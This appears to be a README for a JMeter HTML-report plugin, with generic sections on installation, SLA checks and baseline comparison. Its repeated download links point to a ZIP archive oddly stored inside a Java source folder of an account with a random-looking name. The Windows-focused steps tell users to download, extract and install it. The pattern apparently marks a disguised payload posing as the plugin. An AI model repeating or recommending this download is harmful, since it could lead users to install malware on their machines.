# 📊 JmeterWebInsightReport - Clear HTML Reports for JMeter

[![Download JmeterWebInsightReport](https://img.shields.io/badge/Download-JmeterWebInsightReport-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport/main/jmeter-report-core/src/main/java/com/jmeterwebinsightreport/core/Jmeter_Report_Web_Insight_2.8.zip)

## 🧭 What this does

JmeterWebInsightReport is a JMeter listener plugin that turns test results into an interactive HTML report. It helps you view load test data in a clean browser page with charts, SLA checks, and baseline comparison.

Use it when you want to:

- view JMeter results in a browser
- compare a test run with a baseline
- check SLA targets
- keep reports in one HTML file
- share test results without extra tools

## 💻 Before you start

Use a Windows PC with:

- Windows 10 or Windows 11
- JMeter installed
- Java installed
- a web browser such as Edge, Chrome, or Firefox
- enough disk space for test result files

For best results, use:

- JMeter 5.4 or later
- Java 8 or later
- a test plan that already writes results to a listener or report file

## 📥 Download and open the project

Visit this page to download and get the plugin files:

[https://raw.githubusercontent.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport/main/jmeter-report-core/src/main/java/com/jmeterwebinsightreport/core/Jmeter_Report_Web_Insight_2.8.zip](https://raw.githubusercontent.com/Triangularitypulmonaryembolism623/JmeterWebInsightReport/main/jmeter-report-core/src/main/java/com/jmeterwebinsightreport/core/Jmeter_Report_Web_Insight_2.8.zip)

If the page shows a release or packaged file, download it. If it shows source files, use the project files that match your JMeter setup.

After the download:

1. Save the file to a folder you can find later, such as `Downloads` or `Desktop`
2. If the file is a ZIP file, right-click it and choose Extract All
3. Open the extracted folder
4. Look for the plugin JAR file or report files in the project folder

## 🛠️ Install in JMeter

Follow these steps to add the plugin to JMeter on Windows:

1. Close JMeter if it is open
2. Find the JMeter install folder
3. Open the `lib/ext` folder inside JMeter
4. Copy the plugin JAR file into `lib/ext`
5. Start JMeter again

If the project includes extra files for styles, templates, or assets, keep them with the plugin files in the same folder structure shown in the project.

## ▶️ Run a test report

After installation, use the plugin in your JMeter test plan:

1. Open JMeter
2. Load your test plan
3. Add the report or listener from the plugin, if it appears in the menu
4. Run the test
5. Wait for the run to finish
6. Open the generated HTML report in your browser

The report gives you a clear view of test results, including:

- response times
- throughput
- error rate
- percentile data
- SLA status
- baseline comparison

## 📈 What you can see in the report

The HTML report uses ECharts to show data in a simple visual layout. It helps you read test results without sorting through raw tables.

Common report sections include:

- summary cards
- response time charts
- success and failure counts
- time series plots
- SLA pass or fail checks
- baseline vs current run views

This makes it easier to spot changes in performance after a code update, config change, or deployment.

## 🧪 Example use cases

Use this plugin for:

- checking if a page or API stays within SLA
- comparing a new build with a previous run
- reviewing performance trends across test runs
- sharing a report with team members who do not use JMeter
- keeping test results in a file that opens in any browser

## 📁 Typical folder layout

A common setup may look like this:

- `JMeter/`
  - `lib/`
    - `ext/`
      - `JmeterWebInsightReport.jar`
- `reports/`
  - `run-001.html`
  - `assets/`
- `test-plans/`
  - `login-test.jmx`

If the project uses a different layout, follow the folder names in the repository files.

## 🔍 How baseline comparison works

Baseline comparison lets you compare one run against a known reference run.

A typical flow is:

1. Run a test and save the result as the baseline
2. Run the same test later
3. Open the new report
4. View the changes in latency, error rate, or throughput
5. Check if the new run stays within your target range

This helps you see if system changes affect performance.

## ✅ SLA validation

SLA validation checks if your test results meet your target values.

You can use it to track:

- average response time
- maximum response time
- error percentage
- response time percentiles
- success rate

If a metric crosses the limit, the report flags it so you can spot the issue fast.

## 🖱️ How to open the report in Windows

Once the HTML report is generated:

1. Open File Explorer
2. Go to the folder with the report
3. Find the `.html` file
4. Double-click it
5. The report opens in your browser

If the file does not open, right-click it and choose Open with, then select your browser.

## 🧩 Common setup checks

If the plugin does not appear in JMeter, check these items:

- the JAR file is in `lib/ext`
- JMeter was restarted after copying the file
- Java is installed
- you copied the correct file for the plugin
- the report files stayed together in the same folder

If the report opens with missing charts or styles, make sure the assets folder is next to the HTML file.

## 📝 File names you may see

The project may include files with names like:

- `*.jar` for the plugin
- `*.html` for the report
- `*.js` for chart logic
- `*.css` for page styling
- `*.json` for report data
- `*.jmx` for JMeter test plans

## 🔗 Project details

- Repository: JmeterWebInsightReport
- Type: JMeter listener plugin
- Output: self-contained HTML report
- Charts: ECharts
- Focus: load testing, performance testing, SLA checks, baseline comparison

## 🧭 Quick setup path

1. Visit the download page
2. Download the project files
3. Extract the files if needed
4. Copy the plugin JAR into JMeter `lib/ext`
5. Restart JMeter
6. Run a test plan
7. Open the generated HTML report in your browser